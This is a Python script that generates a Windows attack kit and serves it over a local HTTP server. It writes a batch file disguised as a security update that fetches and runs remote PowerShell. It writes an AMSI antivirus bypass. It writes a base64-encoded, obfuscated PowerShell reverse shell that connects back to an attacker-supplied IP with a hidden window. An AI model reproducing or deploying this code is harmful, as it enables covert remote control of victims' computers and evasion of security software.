#!/usr/bin/python3
import base64
import os,sys

IP = input("Reverse Shell IP: ")
Port = input("Reverse Shell Port: ")
server_port = input("Hosting Server Port: ")

update_file = f'''@ECHO OFF
po""weR""sHelL -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('http://{IP}:{server_port}/WinSecurityUpdate')"'''

amsi_bypass = '''$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' ;; $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)) ;; $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static') ;; $field.SetValue($null,$true)'''

def reverse_shell():
    reverse_shell = '''$client = NeW-OBjeCt S""yST""Em.nEt.S""OcK""etS.T""C""P""Cli""ent("'''+IP+'''",'''+Port+''');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
''' 
    reverse_shell_bytes = reverse_shell.encode("ascii")
    encoded_reverse_shell = base64.b64encode(reverse_shell_bytes)
    encoded_reverse_shell_string = encoded_reverse_shell.decode("ascii")
    f = open("r1","w")
    f.write(f'''$reverse = "{encoded_reverse_shell_string}"\r\n''')
    f.write('''$update_reverse = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reverse))\r\n''')
    f.write('''echo $update_reverse | pow""e""rsh""ell -nop -windowstyle hidden -\r\n''')
    f.close()
reverse_shell()

def create_Security_update():
    call_amsi = f'''InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://{IP}:{server_port}/a1')'''
    call_amsi_bytes = call_amsi.encode("ascii")
    encoded_call_amsi = base64.b64encode(call_amsi_bytes)
    encoded_call_amsi_string = encoded_call_amsi.decode("ascii")
    call_reversesh = f'''InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://{IP}:{server_port}/r1')'''
    call_reversesh_bytes = call_reversesh.encode("ascii")
    encoded_call_reversesh = base64.b64encode(call_reversesh_bytes)
    encoded_call_reversesh_string = encoded_call_reversesh.decode("ascii")
    f = open("WinSecurityUpdate","w")
    f.write(f'''$a1 = "{encoded_call_amsi_string}" \r\n''')
    f.write(f'''$r1 = "{encoded_call_reversesh_string}" \r\n''')
    f.write('''$update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1)) \r\n''')
    f.write('''$update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1)) \r\n''')
    f.write('''echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden - \r\n''')
    f.close()
create_Security_update()


def create_file(cmd, file_name):
    f = open(file_name, "w")
    f.write(cmd)
    f.close()

create_file(update_file,"update.cmd")
create_file(amsi_bypass,"a1")

def Server(port):
    os.system(f"python3 -m http.server {port}")
Server(server_port)


